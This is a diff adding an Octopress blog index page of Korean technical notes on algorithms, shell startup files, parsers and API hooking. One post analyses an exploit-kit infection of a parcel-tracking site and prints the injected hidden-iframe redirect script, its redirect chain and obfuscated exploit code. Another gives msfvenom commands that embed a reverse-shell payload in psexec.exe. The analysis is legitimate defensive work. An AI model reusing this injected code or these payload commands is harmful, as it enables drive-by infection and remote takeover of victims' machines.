@@ -1,0 +1,1713 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="Unix shell initialization Shell modes login shell - e.g. when you login from another host, or login at the text console of a local unix machine &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/posts/18/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/09/03/shell-initialization/">Shell Initialization</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-09-03T23:28:00+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2013</span></span> <span class='time'>11:28 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://github.com/sstephenson/rbenv/wiki/Unix-shell-initialization">Unix shell initialization</a></p>
+
+<h3>Shell modes</h3>
+
+<ul>
+<li>login shell - e.g. when you login from another host, or login at the text console of a local unix machine</li>
+<li><p>interactive shells - ones connected to a terminal (or pseudo-terminal in the case of, say, a terminal emulator running under a windowing system).</p></li>
+<li><p><code>-l</code>, <code>--login</code></p></li>
+<li><code>-i</code></li>
+</ul>
+
+
+<p>.bashrc in only read by a shell that&rsquo;s both interactive and non-login.</p>
+
+<h3>OS X</h3>
+
+<ul>
+<li>Opening a new Terminal window/tab: .bash_profile</li>
+<li>Logging into a system via SSH: .bash_profile</li>
+<li>Executing a command remotely with ssh or Capistrano: .bashrc</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/08/29/the-long-goodbye/">The Long Goodbye</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-08-29T23:58:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>11:58 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>EK 가 설치되어 있는 사이트.</p>
+
+<p>G마켓 자체 페이지는 아니고, 배송조회하면 연결되는 택배회사의 배송조회 페이지.</p>
+
+<pre><code>URL: hxxp://www.yellowcap.co.kr/custom/inquiry_result.asp?INVOICE_NO=81800192001
+</code></pre>
+
+<p>페이지 소스를 보니,</p>
+
+<pre><code>&lt;script type="text/javascript" language="javascript" src="/common/js/embed.js"&gt;&lt;/script&gt;
+</code></pre>
+
+<p>로 embed.js 를 땡기고 있었다.</p>
+
+<p>embed.js 를 보니, 마지막에 다음과 같은 redirection code 가 들어있었다.</p>
+
+<pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
+if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
+e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
+return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
+3.p("&lt;6 s=r://u.w/v/t/q/l.k m=n o=0&gt;&lt;/6&gt;")}',33,33,
+'||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
+toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))
+</code></pre>
+
+<p>난독화 해제를 했더니,</p>
+
+<pre><code>if (document.cookie.indexOf('hsblm=') == -1) {
+    var expires = new Date();
+    expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
+    document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
+    document.write("&lt;iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0&gt;&lt;/iframe&gt;")
+}
+</code></pre>
+
+<p>로 dangguro.com 으로 traffic 을 돌리는 iframe 을 삽입한다.</p>
+
+<pre><code>URL: hxxp://dangguro.com/upload/goods/pop/ye.html
+</code></pre>
+
+<p>ye.html 을 봤더니</p>
+
+<pre><code>&lt;iframe src=http://www.zzizile.net//data/geditor/1307/pop/index.html width='1' height='1'&gt;&lt;/iframe&gt;
+</code></pre>
+
+<p>로 다시 redirect 한다.</p>
+
+<pre><code>URL: hxxp://www.zzizile.net//data/geditor/1307/pop/index.html
+</code></pre>
+
+<p>www.zzizile.net 을 따라가 보았다.</p>
+
+<pre><code>&lt;script language="javascript" src="http://count5.51yes.com/click.aspx?id=52194144&amp;logo=1" charset="gb2312"&gt;&lt;/script&gt;
+&lt;script type="text/javascript" src="swfobject.js"&gt;&lt;/script&gt;
+&lt;script src=jpg.js&gt;&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+var tmoRu2=navigator.userAgent.toLowerCase();
+var NOmT2="1"+"1"+"1";
+if(document.cookie.indexOf("YCAo6=")==-1 &amp;&amp; tmoRu2.indexOf("linux")&lt;=-1 &amp;&amp; tmoRu2.indexOf("bot")==-1 &amp;&amp; tmoRu2.indexOf("spider")==-1)
+{
+var VJhjJoY8=deconcept.SWFObjectUtil.getPlayerVersion();
+var expires=new Date();
+expires.setTime(expires.getTime()+24*60*60*1000);
+NOmT2="0"+"0";
+document.cookie="YCAo6=Yes;path=/;expires="+expires.toGMTString();
+if(document.location.hostname.length&gt;0){pimOD5="1"+"1";delete pimOD5;try{pimOD5+=
+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0";}catch(e){var IzhH1="1";AMJP8 = eval}mOQyUG8=unescape;}
+gROR3="3C7F265941303D6B32471514405B3D4439482417BE6D1343C4453A0FA317510ABF19510EAB045234FF580122B3
+421825FB560261C0511620C225542CD621EE38DA24E031C763FE11DE25E84F9969F319817BBC54CE57EF12B541FA18A501C01FB654
+...
+</code></pre>
+
+<p>로 시작하는 heavily obfuscated 된 자바스크립트가 나온다.</p>
+
+<p>swfobject.js 가 있는 것으로 봐서, 여기서부터 Browser fingerprinting 을 해서, 취약한 부분을 찾아내,
+적절한 공격을 하는 것으로 보인다.</p>
+
+<p>일단 이 화일을 VirusTotal 에 올려보았다.</p>
+
+<p>45 개의 Anti-virus 엔진중에서 19 개가 악성으로 판정하였다. 국산 엔진들은 잡아내지 못했다.</p>
+
+<p>McAfee 는 JS/Exploit-Godakit.a 라고 판정하고 BitDefender 는 JS:Exploit.BlackHole.AL 이라고 판정하였다.</p>
+
+<p>사용된 화일로 봐서는, Gong Da 가 맞다.</p>
+
+<p>Sandbox 에 넣고 돌렸다.</p>
+
+<p>튀어나오는 URL 들은</p>
+
+<pre><code>http://www.uthkorea.com
+
+http://www.monggus.com
+
+http://count18.51yes.com
+
+http://211.43.212.192
+
+http://101.79.5.31
+</code></pre>
+
+<p>이다. count18.51yes.com 은 China Telecom Jiangsu 라는 업체에서 호스팅하고 있다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/08/29/reflective-dll-injection/">Reflective DLL Injection</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-08-29T13:00:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>1:00 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>손을 대야 할 것들이</p>
+
+<ul>
+<li>Reflective DLL injection</li>
+<li>Dynamic forking</li>
+<li>Inline hooking</li>
+</ul>
+
+
+<p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">stephenfewer/ReflectiveDLLInjection</a>
+을 읽고.</p>
+
+<pre><code>Reflective DLL injection is a library injection technique in which the concept
+of reflective programming is employed to perform the loading of a library from
+memory into a host process.
+</code></pre>
+
+<p>Reflective programming 이라 함은,</p>
+
+<pre><code>In computer science, reflection is the ability of a computer program to
+examine and modify the structure and behavior (specifically the values,
+meta-data, properties and functions) of an object at runtime.
+</code></pre>
+
+<p>우선 Metasploit Patch</p>
+
+<pre><code>msfvenom -p windows/shell_reverse_tcp -x psexec.exe ... The overwrite program entry method
+msfvenom -p windows/shell_reverse_tcp -x psexec.exe -k ... The aloocate and create thread and return to original program entry method (Keep)
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/08/29/kargers-algorithm/">Karger's Algorithm</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-08-29T12:39:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:39 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>Karger&rsquo;s Algorithm</h3>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/08/28/karatsuba-algorithm/">Karatsuba Algorithm</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-08-28T02:19:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>2:19 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>Karatsuba Algorithm</h3>
+
+<p>Karatsuba 가 23 살때 발명한 알고리즘.</p>
+
+<pre><code>def kara(x,y):
+    n = len(str(x))
+    n2 = pow(10,n/2)
+    a = x / n2
+    b = x % n2
+    c = y / n2
+    d = y % n2
+    ans = pow(10,n)*a*c + pow(10,n/2)*(a*d+b*c) + b*d
+
+    return ans
+
+if __name__ == "__main__":
+    x = 4586
+    y = 1234
+    ans = kara(x,y)
+    print "%d == %d" % (ans, x*y)
+</code></pre>
+
+<p>여기서 n-digit 숫자간의 곱셈을 n/2-digit 숫자간의 곱셈으로 divide 할 수 있다.
+recursive 하게 적용하면, n-digit by n-digit 을 곱하는 일반적인 곱셈의 복잡도 Theta(N<sup>2</sup>)
+를 Theta(N^\log_2 3) 으로 낮출 수 있다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/08/22/elementary-cellular-automata/">Elementary Cellular Automata</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-08-22T00:34:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2013</span></span> <span class='time'>12:34 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://mathworld.wolfram.com/ElementaryCellularAutomaton.html">Elementary Cellular Automaton</a> 를 1 라인으로 구현한 코드.</p>
+
+<p><a href="http://www.ioccc.org/2012/konno/konno.c">Best one liner: konno.c</a></p>
+
+<p>konno.c</p>
+
+<pre><code>int _;main(O,l,o)char**l,**o;{_++&gt;&gt;9||main(1&amp;(o?(int)o:O)|O*2,l,
+putchar(_%32?atoi(1[l])&gt;&gt;(7&amp;O&lt;&lt;!o&gt;&gt;!o+29)&amp;32&lt;_|_==16?35:32:10)%10);}
+</code></pre>
+
+<p>이것을 해독해보았다.</p>
+
+<pre><code>int pos=0;
+
+void p_b(int x)
+{
+    int b[33];
+    char *p;
+    int i;
+    unsigned int j;
+
+    memset(b,0,33);
+    for(i=32, j=(1L&lt;&lt;31); i&gt;0; i--,j&gt;&gt;=1)
+        *p++=(x&amp;j) ==j ? '1':'0';
+    return b;
+}
+
+main(evolution_seq,argv,prev_cell)
+int evolution_seq;
+char **argv;
+int prev_cell;
+{
+    /* recurse from pos=1 to pos=512 */
+    if (pos++ &lt; 32*16) {
+        int cell_color;
+
+        /* Fill the 1st line with seed value */
+        if (pos == 16)
+            cell_color = '#';       /* The 1st line: the mid pos is '#' */
+        else if (pos &lt; 32)
+            cell_color = ' ';       /* The 1st line: fill with ' ' except the mid pos */
+        else if (pos % 32 == 0)
+            cell_color = '\n';      /* Print newline for every 32nd pos */
+        else {
+            int rule;
+
+            /* 
+            * Get the hight-order 3 bits of evolution sequence
+            * (clears MSB if the previous cell was new-line)
+            * and shift rule bits by it.
+            */
+            if (prev_cell == '\n')
+                rule = atoi(argv[1]) &gt;&gt; (evolution_seq &lt;&lt; 1 &gt;&gt; 30 &amp; 0x7);  
+            else
+                rule = atoi(argv[1]) &gt;&gt; (evolution_seq &gt;&gt; 29 &amp; 0x7);
+
+            if (rule &amp; 0x1)
+                cell_color = '#'; /* black */
+            else
+                cell_color = ' '; /* white */
+        }        
+        putchar(cell_color);
+
+        if (prev_cell == '#') { 
+            evolution_seq = evolution_seq * 2 + 1;
+        } else 
+            evolution_seq = evolution_seq * 2; 
+
+        main(evolution_seq, argv, cell_color);
+    }
+}
+
+~% gcc k.c -o k
+~% ./k 126
+               #               
+              ###              
+             ## ##             
+            #######            
+           ##     ##           
+          ####   ####          
+         ##  ## ##  ##         
+        ###############        
+       ##             ##       
+      ####           ####      
+     ##  ##         ##  ##     
+    ########       ########    
+   ##      ##     ##      ##   
+  ####    ####   ####    ####  
+ ##  ##  ##  ## ##  ##  ##  ## 
+###############################
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/08/20/recursive-things/">Recursive Things</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-08-20T12:15:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>&ldquo;알고리즘 문제 해결 전략&rdquo; 이라는 책을 읽고 있다. algospot.com 의 운영자가 쓴 책이다.</p>
+
+<h3>Combination</h3>
+
+<p>1 ~ 9 사이의 숫자를 4 개 뽑는 combination 구하기.</p>
+
+<pre><code>def pick(selection, last):
+    if len(selection) == 4:
+        print selection
+        return
+    for i in range(last+1,9):
+        selection.append(i)
+        pick(selection, i)
+        selection.remove(i)
+
+if __name__ == "__main__":
+    selection = []
+    pick(selection, 0)
+</code></pre>
+
+<h3>음식 대접</h3>
+
+<p>음식을 가리는 4 명의 사람들에게 6 가지의 메뉴 중, 최소한의 메뉴를 준비해서 대접하는 문제.</p>
+
+<pre><code>answer = []
+
+def OK(menu):
+    bit = 0
+    if 1 in menu:
+        bit = bit | 0b1100
+    if 2 in menu:
+        bit = bit | 0b1001
+    if 3 in menu:
+        bit = bit | 0b0101
+    if 4 in menu:
+        bit = bit | 0b0001
+    if 5 in menu:
+        bit = bit | 0b0110
+    if 6 in menu:
+        bit = bit | 0b1010
+
+    if bit == 0b1111:
+        return True
+    else:
+        return False
+
+def Explore(menu, depth):
+    if depth == 7:
+        if OK(menu):
+            answer.append( (len(menu), list(menu)) )
+            return len(menu)
+        else:
+            return 987654321
+    menu.append(depth)
+    size = Explore(menu, depth + 1)
+    menu.pop()
+    size2 = Explore(menu, depth + 1)
+    if size &lt; size2:
+        return size
+    else:
+        return size2
+
+if __name__ == "__main__":
+    menu = []
+    min = Explore(menu,1)
+    for (x,y) in answer:
+        if x == min:
+            print y
+</code></pre>
+
+<h3>구간 max</h3>
+
+<p>Recursive algorithm 은 아니지만.</p>
+
+<p>{ 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, -28, 9, 10, -12, 13, 5 } 라는 어레이에서 summation_from_i_to_j 가 가장 큰 index i, j 를 찾는 문제. 무식하지 않게 하는 것이 포인트.</p>
+
+<p>우선 O(N<sup>2</sup>) 으로 하는 방법은 간단하다.</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+main()
+{
+    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
+    int N = sizeof a / sizeof (int);
+
+    int i,j;
+    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
+    int sum;
+    int _i,_j;
+
+    for (i = 0; i &lt; N; i++) {
+        sum = 0;
+        for (j = i; j &lt; N; j++) {
+            sum += a[j];
+            if (sum &gt; max) {
+                max = sum;
+                _i = i;
+                _j = j;
+            }
+        }
+    }
+    printf("sum(%d, %d) = %d\n", _i, _j, max);
+}
+</code></pre>
+
+<p>O(N) 알고리즘.</p>
+
+<ol>
+<li>과거를 잊고 새로 summation 을 시작해야 할지를 계속 결정해야 한다.</li>
+<li>과거가 minus 라면 싹 잊고 새로 시작하는 것이 낫다.</li>
+<li>과거가 그래도 plus 라면 구간합을 올리는데 도움은 된다.</li>
+<li>음수인 구간합은 의미가 없다. 0 이 낫다.</li>
+<li>i 까지의 최대구간합은 maxAt(i) = max( 0, maxAt(i-1) ) + a[i]</li>
+</ol>
+
+
+<p>등을 가지고 만들어본다.</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define MAX(a,b) (a &gt; b ? a : b)
+sum2() 
+{
+    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
+    int N = sizeof a / sizeof (int);
+    int partial_sum = 0;
+    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
+    int i;
+
+    for (i = 0; i &lt; N; ++i) {
+        partial_sum = MAX(partial_sum, 0) + a[i];
+        max = MAX(partial_sum, max);
+    }
+    printf("max %d\n", max);
+    return max;
+}
+</code></pre>
+
+<p>여기서 구간을 알아내도록 고쳐보면,</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int _start = 0;
+int _end = 0;
+
+sum2() 
+{
+    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
+    int N = sizeof a / sizeof (int);
+    int partial_sum = 0;
+    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
+    int i;
+
+    for (i = 0; i &lt; N; ++i) {
+        if (partial_sum &lt; 0) {
+            partial_sum = a[i];
+            _start = i;
+        } else
+            partial_sum = partial_sum + a[i];
+
+        if (partial_sum &gt; max) {
+            max = partial_sum;
+            _end = i;
+        } 
+    }
+    return max;
+}
+main(){printf("sum(%d-%d) = %d\n",_start,_end,sum2());}
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/08/20/windows-api-hooking/">Windows API Hooking</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-08-20T09:37:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>9:37 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>몇 가지 Windows API Hooking 라이브러리를 테스트 해보기로 했다.</p>
+
+<p>Microsoft 의 Detours. x86 버전만 free 이고, x64 버전은 돈을 받는다. 탈락.</p>
+
+<p><a href="http://www.codeproject.com/Articles/44326/MinHook-The-Minimalistic-x86-x64-API-Hooking-Libra">MinHook - The Minimalistic x86/x64 API Hooking Library</a> 을 발견.</p>
+
+<p>읽고 정리해본다.</p>
+
+<p>Inline hooking 을 하는 듯 하다.</p>
+
+<p>Target funciton 의 진입 부분을 JMP 로 overwrite 한다.</p>
+
+<p>x86 모드에서는 Target function 이 0x4000 0000 부근에 있다고 가정하면,
+5 bytes 를 차지하는 32bit relative JMP 로 커버 가능하다.</p>
+
+<pre><code>0x4000 0000: E9 FB FF FF BF           JMP 0x0
+0x4000 0000: E9 FA FF FF BF           JMP 0xFFFFFFFF 
+</code></pre>
+
+<p>Target funciton (i.e. USER32.dll!MessageBoxW) 의 진입부분을 JMP 로 overwrite 하고,
+Detour 로 뛰었다가, 다시 원래 코드로 돌아가야 한다.</p>
+
+<p>이 부분을 Trampoline Function 이라고 부르는데, &ldquo;원래 함수의 앞부분을 클론한 것&rdquo; +
+&ldquo;JMP to 원래 함수&rdquo; 로 이루어져 있다.</p>
+
+<pre><code>; Original
+0x770E 11E4: 48 83 EC 38              SUB RSP, 0x38
+0x770E 11E8: 45 33 DB                 XOR R11D, R11D
+; Trampoline
+0x7706 4BD0: 48 83 EC 38              SUB RSP, 0x38
+0x7706 4BD4: 45 33 DB                 XOR R11D, R11D
+0x7706 4BD7: FF 25 5B E8 FE FF        JMP QWORD NEAR [0x77053438]
+0x7705 3438: EB 11 0E 77 00 00 00 00
+</code></pre>
+
+<p>Visual Studio 2013 으로 빌드해서 테스트해보니 잘 동작한다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/06/23/antlr-and-language-implementation-patterns/">ANTLR &amp; Language Implementation Patterns</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-06-23T11:26:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2013</span></span> <span class='time'>11:26 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>ANTLR 의 개발자 T.P. 가 Pragmatic 에서 책을 두 권 출판했다.</p>
+
+<p>처음 예제는 List Parser 를 만드는 것.</p>
+
+<p>리스트라 함은.</p>
+
+<p>[ a,b,c] 나 [a, [x,y,z], b, c]</p>
+
+<p>같은 것들.</p>
+
+<h3>Token</h3>
+
+<p>Token 을 보관하는 데이터 구조.</p>
+
+<p>Type 과 Text 로 이루어져있고,</p>
+
+<p>Type 으로는</p>
+
+<pre><code>T_EOF
+T_NAME
+T_COMMA
+T_LBRACK
+T_RBRACK
+</code></pre>
+
+<p>등이 있다.</p>
+
+<p>Text 에는 &ldquo;<EOF>&rdquo;, &ldquo;NAME&rdquo;, &ldquo;COMMA&rdquo;, &ldquo;LBRACK&rdquo;, &ldquo;RBRACK&rdquo; 등이.</p>
+
+<p>Token class 의 method 로는,</p>
+
+<p>new_token / print_token 정도.</p>
+
+<h3>LL(1) Parser</h3>
+
+<p>기본적인 사상은,</p>
+
+<p>lookahead 오퍼레이션과 consume 을 분리하는 것.</p>
+
+<p>LL(1) Parser 에서는 말장난같지만, LL(k) Parser 로 가면 개념이 명료해짐.</p>
+
+<p>기본적인 함수는 nextToken() - 버퍼를 tokenize 하는 함수.</p>
+
+<p>whitespace 는 consume 해버린다.</p>
+
+<p>&lsquo;,&rsquo;, &lsquo;[&rsquo;, &lsquo;]&rsquo; 을 만나면, consume 하고, 새로운 토큰을</p>
+
+<pre><code>new_token(T_LBRACK, "[") 
+new_token(T_RBRACK, "]") 
+new_token(T_COMMA, ",") 
+</code></pre>
+
+<p>등으로 만들어 리턴.</p>
+
+<p>Character buffer 를 tokenizing 해서 token stream 으로 변환.</p>
+
+<h3>LL(k) Parser</h3>
+
+<p>LL(k) Parser 는 lookahead 를 몇 개 앞의 토큰까지 보고 판단하느냐가 핵심.</p>
+
+<p>1 개의 lookahead 만 가지고 파싱을 진행할 수 있는 문법이 있는가하면,</p>
+
+<p>불가능한 문법도 있기 때문에, LL(k) Parser 가 필요.</p>
+
+<p>LL(1) 에서는 lookahead 토큰 하나만 가지고 했다면, LL(4) 에서는 4 개의 lookahead 토큰을 가지고 파싱 작업을 수행하게 된다.</p>
+
+<p>LIST 를 그래머로 기술하면,</p>
+
+<pre><code>list : '[' elements ']' ;
+elements : element (',' element)* ;
+element : NAME | list
+
+[ a, b, c ] 
+[ a, [ x, y, z ], b ] 
+</code></pre>
+
+<p>등을 기술할 수 있다.</p>
+
+<p>위의 그래머는 다음 코드로 변환된다.</p>
+
+<pre><code>list() { match(T_LBRACK); elements(); match(T_RBRACK); }
+elements() { element(); if (lookahead.type == T_COMMA) { match(T_COMMA); elements(); } }
+element() { 
+  if (lookahead.type == T_NAME) match(T_NAME);
+  else if (lookahead.type == T_LBRACK) list();
+  else throw new Error("unexpeced: " + lookahead.type);
+}
+</code></pre>
+
+<p>결국 해보니, 위의 그래머는 lookahead 하나만 가지고 구현 가능하다. LL(1).</p>
+
+<p>그럼 LL(2) 파서가 필요한 그래머를 만들어본다.</p>
+
+<pre><code>list : '[' elements ']' ;
+elements : element (',' element)* ;
+element : NAME '=' NAME | NAME | list ;
+</code></pre>
+
+<p><code>NAME = NAME</code> 과 <code>NAME</code> 이 동일한 <code>NAME</code> 으로 시작하기때문에, one lookahead 만으로는
+파싱이 불가능하다. two lookaheads 를 유지하도록 한다.</p>
+
+<p>Circular Lookahead Buffer 를 만들어 관리.</p>
+
+<p>[a,b,c] 를 LL(4) 에서 예제.</p>
+
+<pre><code>lookahead[0] '[' &lt;-- bp
+lookahead[1] 'a'
+lookahead[2] ','
+lookahead[3] 'b'
+</code></pre>
+
+<p>가 초기 상태. 4 개의 lookahead 를 가지게 된다.</p>
+
+<p>초기 lookahead 버퍼를 셋업하는 방법은,</p>
+
+<pre><code>lookahead[bp] = lexer.getToken();
+bp = (bp+1) % k;
+</code></pre>
+
+<p>를 k 번 만큼하면, <code>lookahead[0]</code> ~  <code>lookahead[k-1]</code> 까지의 버퍼가 토큰으로 채워지고, bp 는 0 으로 돌아와서, 처음을 가리키게 된다.
+버퍼도 채우고, 맨 처음도 가리키고.</p>
+
+<p>consume 을 한번 하면.</p>
+
+<pre><code>lookahead[0] ','
+lookahead[1] 'a' &lt;-- bp
+lookahead[2] ','
+lookahead[3] 'b'
+</code></pre>
+
+<p>첫 &lsquo;[&rsquo; 는 discard 되고, base pointer 가 전진했으며, 4 개의 lookahead 를 maintain 하기 위해, 새로운 &lsquo;,&rsquo; 가 들어왔다.</p>
+
+<pre><code>lookahead = new Token[4];
+for (i=0;i&lt;4;i++) lookahead[i] = lexer.nextToken();
+bp = 0;
+</code></pre>
+
+<p>하면 초기 CLB 셋업이 끝난다.</p>
+
+<pre><code>consume() { lookahead[bp] = lexer.nextToken(); bp = (bp + 1) % 4; }
+</code></pre>
+
+<p>를 하면 자연스럽게 가장 오래된 것을 버리고, 새로운 토큰을 맨 뒤에 넣고, base pointer 는 circular buffer 의 처음을 가리키게 된다.</p>
+
+<pre><code>LT(i) { return lookahead[bp + i - 1]; }
+</code></pre>
+
+<p>하면 1 번째, 2 번째 등등의 lookahead 를 할 수 있게 된다.</p>
+
+<pre><code>"To visualize parsing decisions, imagine a maze with a single entrance and a
+single exit that has words written on the floor. Every sequence of words along
+a path from entrance to exit represents a sentence. The structure of the maze
+is analogous to the rules in a grammar that define a language. To test a sentence
+for membership in a language, we compare the sentence's words with
+the words along the floor as we traverse the maze. If we can get to the exit by
+following the sentence's words, that sentence is valid."
+</code></pre>
+
+<h3>JSON Grammar</h3>
+
+<p>예제삼아 JSON 을 ANTLR 그래머로 기술해본다.</p>
+
+<pre><code>object
+    : '{' pair (',' pair)* '}'
+    | '{' '}'
+    ;
+
+array
+    : '[' value (',' value)* ']'
+    | '[' ']'
+    ;
+
+value
+    : STRING
+    | NUMBER
+    | object
+    | array
+    | 'true'
+    | 'false'
+    | 'null'
+    ;
+</code></pre>
+
